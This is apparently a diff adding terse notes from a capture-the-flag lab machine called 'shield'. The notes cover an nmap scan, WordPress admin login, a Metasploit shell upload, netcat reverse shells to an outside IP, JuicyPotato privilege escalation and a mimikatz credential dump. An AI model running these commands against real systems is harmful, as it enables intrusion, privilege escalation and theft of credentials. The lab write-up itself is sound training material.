@@ -1,0 +1,49 @@
+shield
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-20 06:11 EDT
+Nmap scan report for 10.10.10.29
+Host is up (0.11s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3306/tcp open  mysql   MySQL (unauthorized)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.97 seconds
+
+
+found via gobuster: 10.10.10.29/wordpress/
+Login with since we got it from the last
+admin:P@s5w0rd!
+
+--Meterpreter shell:
+msfconsole
+use exploit/unix/webapp/wp_admin_shell_upload
+lcd /home/kali/Downloads
+upload /usr/share/windows-binaries/nc.exe
+upload JuicyPotato.exe
+
+--Netcat shell:
+kali$ nc -lvnp 1234
+msf$ execute -f nc.exe -a "-e cmd.exe 10.10.14.116 1234"
+
+--Admin shell with JuicyPotato (an MITM for windows server 2016):
+kali$ nc -lvp 2222
+netcat$ echo START C:\inetpub\wwwroot\wordpress\wp-content\plugins\gmfeeauPBo\nc.exe -e powershell.exe 10.10.14.116 2222 > shell.bat
+netcat$ argb.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\plugins\gmfeeauPBo\shell.bat -l 3333
+
+
+--Getting Sandra:
+
+upload mimikatz.exe (64 bits)
+
+$ ./mimikatz.exe
+
+$ sekurlsa::logonpasswords
+
+sandra:Password1234! 
